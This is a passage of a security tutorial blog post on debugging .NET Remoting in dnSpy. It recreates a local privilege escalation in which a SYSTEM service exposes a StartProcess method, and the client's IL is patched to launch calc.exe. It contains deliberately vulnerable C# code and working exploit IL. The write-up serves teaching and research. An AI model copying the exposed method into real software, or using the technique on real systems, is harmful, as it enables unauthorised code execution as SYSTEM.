&lt;p&gt;Our first instinct would be to put a breakpoint on &lt;code&gt;Add&lt;/code&gt; and let the client &lt;code&gt;Continue&lt;/code&gt;. But &lt;strong&gt;this breakpoint will never trigger&lt;/strong&gt;. Because in .NET Remoting an instance of the function is created on the client and then executed on the server. If you don&amp;rsquo;t believe me, try it. But how do we find who uses this function?&lt;/p&gt;

&lt;h4 id=&#34;4-2-analyze-this:a4cceda545ee0d0782d3d591639b4015&#34;&gt;4.2 Analyze This&lt;/h4&gt;

&lt;p&gt;Now we can use the &lt;code&gt;Analyze&lt;/code&gt; feature of dnSpy. Right click on the &lt;code&gt;Add&lt;/code&gt; function in &lt;code&gt;RemotingLibrary.dll&lt;/code&gt; and select &lt;code&gt;Analyze&lt;/code&gt;. Now a very handy new pane (window? seriously what are these called?) named &lt;code&gt;Analyzer&lt;/code&gt; pops up. We can see the function and two items &lt;code&gt;Uses&lt;/code&gt; and &lt;code&gt;Used By&lt;/code&gt;. &lt;code&gt;Uses&lt;/code&gt; shows us the other functions (in loaded binaries in dnSpy) that are used by &lt;code&gt;Add&lt;/code&gt; and &lt;code&gt;Used By&lt;/code&gt; shows other functions that use &lt;code&gt;Add&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/10.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;That is a very nifty feature, neh? As you can see we can go down the wormhole and follow the chain. In this case we see that the &lt;code&gt;Main&lt;/code&gt; function calls &lt;code&gt;Add&lt;/code&gt;. If we double click on &lt;code&gt;Main&lt;/code&gt; we will go back to the original entry point.&lt;/p&gt;

&lt;h4 id=&#34;4-3-net-remoting-in-action:a4cceda545ee0d0782d3d591639b4015&#34;&gt;4.3 .NET Remoting in Action&lt;/h4&gt;

&lt;p&gt;Now we can &lt;code&gt;Step Into&lt;/code&gt; the line that calls &lt;code&gt;Add&lt;/code&gt; in the client. If you have not changed the default settings, you should land in &lt;code&gt;mscorlib.dll&lt;/code&gt; or more exactly in &lt;code&gt;CommonLanguageRuntimeLibrary.System.Runtime.Remoting.Proxies.RealProxy.PrivateInvoke()&lt;/code&gt;. dnSpy&amp;rsquo;s default settings, will skip all the other code (like attribute get/set etc). You can change this in &lt;code&gt;View (menu) &amp;gt; Options (menu item) &amp;gt; Debugger (tab) &amp;gt; DebuggerBrowsable&lt;/code&gt; and &lt;code&gt;Call string-conversion&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/11.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;In order to see local variables and their values press &lt;code&gt;Alt+4&lt;/code&gt; to open the &lt;code&gt;Locals&lt;/code&gt; window. This was changed in version 1.3 and up and is a huge UX upgrade.&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/12.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;This where we always end up after following .NET Remoting calls; where the message is being sent and we can see its contents. In version 1.3 of dnSpy, any breakpoints set here would not be triggered but now we can do it (what a time to be alive). So you can set a breakpoint on line 404 (if you can find it &lt;em&gt;he he he&lt;/em&gt;) &lt;code&gt;RemotingProxy remotingProxy = null;&lt;/code&gt; just right before &lt;code&gt;if (1 == type)&lt;/code&gt; and look at messages.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Type == 1&lt;/code&gt; so the first &lt;code&gt;if&lt;/code&gt; will be true. Let&amp;rsquo;s look at it (with some comments):&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;type)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;Message&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;expr_14&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Message();&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;// msgData is one of the function parameters (along with type) and contains the message info&lt;/span&gt;
  &lt;span style=&#34;color: #586E75&#34;&gt;// we can see that it is used to populate expr_14 which looks like a temp Message&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;expr_14.InitFields(msgData);&lt;/span&gt;

  &lt;span style=&#34;color: #586E75&#34;&gt;// expr_14 is copied to message&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;message&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;expr_14;&lt;/span&gt;			&lt;span style=&#34;color: #586E75&#34;&gt;// put a breakpoint here&lt;/span&gt;

  &lt;span style=&#34;color: #93A1A1&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;expr_14.GetCallType();&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s put a breakpoint on line &lt;code&gt;409 num = message = expr_14;&lt;/code&gt; and continue. When we reach this line, we can step over it until we reach line &lt;code&gt;410&lt;/code&gt; and then see the contents of the variable named &lt;code&gt;message&lt;/code&gt;. Why didn&amp;rsquo;t we put a breakpoint on the next line? Because if it won&amp;rsquo;t trigger with default settings (remember those debugger settings at the start of this section?). Press &lt;code&gt;Alt+4&lt;/code&gt; to look at &lt;code&gt;message&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/13.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;We can see the message and a lot of information about it. Scroll down to line &lt;code&gt;474 RealProxy.HandleReturnMessage(message, message2);&lt;/code&gt; and set a breakpoint on line &lt;code&gt;475&lt;/code&gt; and &lt;code&gt;Continue&lt;/code&gt;. We can see that the text in the function is printed on the server and we land in the new breakpoint and can see the return value in &lt;code&gt;message2&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/14.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;If we &lt;code&gt;Step Out&lt;/code&gt; we will land back in &lt;code&gt;Main&lt;/code&gt;. Try doing the same for the &lt;code&gt;Sub&lt;/code&gt; function call.&lt;/p&gt;

&lt;p&gt;Now we know the places to see the outgoing .NET Remoting message and return values. In a real world project we could do this to look at the messages instead of Wireshark or developing our own .NET Remoting proxy.&lt;/p&gt;

&lt;h3 id=&#34;a-name-ch5-a-5-re-creating-the-vulnerability:a4cceda545ee0d0782d3d591639b4015&#34;&gt;&lt;a name=&#34;ch5&#34;&gt;&lt;/a&gt; 5. Re-creating the Vulnerability&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Please run this application in a Virtual Machine disconnected from the internet. This application will make your machine vulnerable to unauthenticated RCE. Make sure that Windows firewall is not disabled and do not allow &lt;code&gt;Server.exe&lt;/code&gt; through it. I believe the chance of someone getting compromised is very very slim because no one reads these posts anyway, but it never hurts to be careful.&lt;/p&gt;

&lt;p&gt;One application that I looked at, let&amp;rsquo;s call it &lt;code&gt;Remoting Expanded&lt;/code&gt; had two components. A server which was run as &lt;code&gt;SYSTEM&lt;/code&gt; on startup via a Windows service and a client application which was executed by an standard user. Client used .NET Remoting to execute functions in server to perform actions that were not available to standard users. I basically went through the same steps to look at and debug the .NET Remoting calls. I was looking at the decompiled code of the DLL containing the remotable objects and discovered that there are a lot of exposed functions which are not used by the client application. One of them was &lt;code&gt;StartProcess&lt;/code&gt; (that&amp;rsquo;s not its real name) and executed an executable as SYSTEM.&lt;/p&gt;

&lt;p&gt;To re-create we are going to change our code and add a new function to the &lt;code&gt;RemotingLibrary&lt;/code&gt; DLL. Client and server are not modified but be sure to rebuild the solution to get the new DLL in build directories of client and server projects. I created a new project and called it &lt;code&gt;RemotingLibraryExpanded&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;RemotingLibraryExpanded.cs&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;namespace&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;RemotingLibraryExpanded&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;RemoteMathExpanded&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;MarshalByRefObject&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Add&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;a,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;b)&lt;/span&gt;    &lt;span style=&#34;color: #586E75&#34;&gt;// add&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;Console.WriteLine(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Add({0},{1}) called&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;a,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;b);&lt;/span&gt;
      &lt;span style=&#34;color: #719e07&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;b;&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color: #719e07&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Sub&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;a,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;b)&lt;/span&gt;    &lt;span style=&#34;color: #586E75&#34;&gt;// subtract&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;Console.WriteLine(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Sub({0},{1}) called&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;a,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;b);&lt;/span&gt;
      &lt;span style=&#34;color: #719e07&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;b;&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color: #586E75&#34;&gt;// super secret process start method&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;StartProcess&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;processPath)&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;Console.WriteLine(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Starting process {0}&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;processPath);&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;Process.Start(processPath);&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Now we can rebuild the solution. Client and server will run as before now we want to exploit this new method to do local privilege escalation (running the executable of our choice as SYSTEM). At this point we can either write code (which we already did) or modify the client application using dnSpy (and some other tools). I modified the application in my project because it was much easier than writing code from scratch because there were a lot of stuff happening before the client started making calls to server.&lt;/p&gt;

&lt;h3 id=&#34;a-name-ch6-a-6-modifying-il-instructions-with-dnspy-and-patching-binaries:a4cceda545ee0d0782d3d591639b4015&#34;&gt;&lt;a name=&#34;ch6&#34;&gt;&lt;/a&gt; 6. Modifying IL Instructions with dnSpy and Patching Binaries&lt;/h3&gt;

&lt;p&gt;The easiest thing to do is to modify one of the function calls to call &lt;code&gt;StartProcess&lt;/code&gt; and run an executable (e.g. &lt;code&gt;C:\Windows\System32\calc.exe&lt;/code&gt;). Open the client in dnSpy and right click on the line that calls &lt;code&gt;Add&lt;/code&gt; (line 16 in dnSpy). Choose &lt;code&gt;Edit IL Instructions&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/15.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;What is IL? CIL (Common Intermediate Language) or IL is (almost) the .NET equivalent of Java bytecode. Let&amp;rsquo;s look at what we got and see if we can decipher it (read the comments please):&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;IL code for line 16&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #586E75&#34;&gt;// pop remoteMathObject from stack and put it in local variable 1&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;	&lt;span style=&#34;color: #2AA198&#34;&gt;0028&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;stloc.&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;// push the string to stack&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;13&lt;/span&gt;	&lt;span style=&#34;color: #2AA198&#34;&gt;0029&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;ldstr&lt;/span&gt;	&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Result of Add(1, 2): {0}&amp;quot;&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;// push local variable 1 to stack. In this case, remoteMathObject is pushed to stack&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;// this is done because we are going to call remoteMathObject.Add&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;14&lt;/span&gt;	&lt;span style=&#34;color: #2AA198&#34;&gt;002&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;E&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;ldloc.&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;// push the value 0x1 to the stack&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;// IL has ldc.i4.1 to ldc.i4.8 and also a separate ldc.i4 &amp;lt;Int32&amp;gt; to push Ints to the stack&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;15&lt;/span&gt;	&lt;span style=&#34;color: #2AA198&#34;&gt;002F&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;ldc.i4.&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;// push the value 0x2 to the stack&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;16&lt;/span&gt;	&lt;span style=&#34;color: #2AA198&#34;&gt;0030&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;ldc.i4.&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;// call Add&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;17&lt;/span&gt;	&lt;span style=&#34;color: #2AA198&#34;&gt;0031&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;callvirt&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;instance&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;int32&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[RemotingLibrary]RemotingSample.RemoteMath::Add(int32,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;int32)&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;// box converts a value type to an object reference.&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;// I assume it means that we are converting the result of add to Int32&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;	&lt;span style=&#34;color: #2AA198&#34;&gt;0036&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;box&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;[mscorlib]System.Int32&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;// call console.writeline (parameters are the format string that was pushed to stack and return value of add)&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;	&lt;span style=&#34;color: #2AA198&#34;&gt;003&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;B&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;call&lt;/span&gt;	&lt;span style=&#34;color: #719e07&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[mscorlib]System.Console::WriteLine(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;string&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;object&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Now we have a general idea of what&amp;rsquo;s happening here. We need to change &lt;code&gt;Add&lt;/code&gt; to &lt;code&gt;StartProcess&lt;/code&gt;. Click on &lt;code&gt;Add&lt;/code&gt; and a small context menu pops up.&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/16.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Select &lt;code&gt;Method&lt;/code&gt; and a new page pops up that allows you to modify it to any method in all loaded assemblies. We can see the new fancy &lt;code&gt;StartProcess&lt;/code&gt; function. So we select that. There&amp;rsquo;s also a handy search feature.&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/17.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;The method call is changed but &lt;code&gt;Add&lt;/code&gt; had two Int32 parameters while &lt;code&gt;StartProcess&lt;/code&gt; has only one string parameter. Without more modifications, two Int32s are pushed to the stack before the new method is being called. If we press OK on the IL code window we will see this monstrosity.&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/18.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;But that&amp;rsquo;s fine, we can edit the IL instructions and fix it. But how do we know what to do? At this point we can just learn IL coding but based on the instructions that we have seen, we should have a general idea of what to do. We also need to remove the &lt;code&gt;Console.WriteLine&lt;/code&gt; because &lt;code&gt;StartProcess&lt;/code&gt; has no return value (well &lt;code&gt;void()&lt;/code&gt; but you know what I mean) and we should be calling &lt;code&gt;remoteMathObject.StartProcess(&amp;quot;c:\\windows\\system32\\calc.exe&amp;quot;);&lt;/code&gt; individually.&lt;/p&gt;

&lt;p&gt;The following IL code does the trick:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Fixed IL instructions&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;	&lt;span style=&#34;color: #2AA198&#34;&gt;0028&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;stloc.&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;13&lt;/span&gt;	&lt;span style=&#34;color: #2AA198&#34;&gt;0029&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;ldloc.&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;14&lt;/span&gt;	&lt;span style=&#34;color: #2AA198&#34;&gt;002&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;A&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;ldstr&lt;/span&gt;	&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;c:\\windows\\system32\\calc.exe&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;15&lt;/span&gt;	&lt;span style=&#34;color: #2AA198&#34;&gt;002F&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;callvirt&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;instance&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[RemotingLibraryExpanded]RemotingLibraryExpanded.RemoteMathExpanded::StartProcess(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;string&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;16&lt;/span&gt;	&lt;span style=&#34;color: #2AA198&#34;&gt;0034&lt;/span&gt;	&lt;span style=&#34;color: #93A1A1&#34;&gt;nop&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/19.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

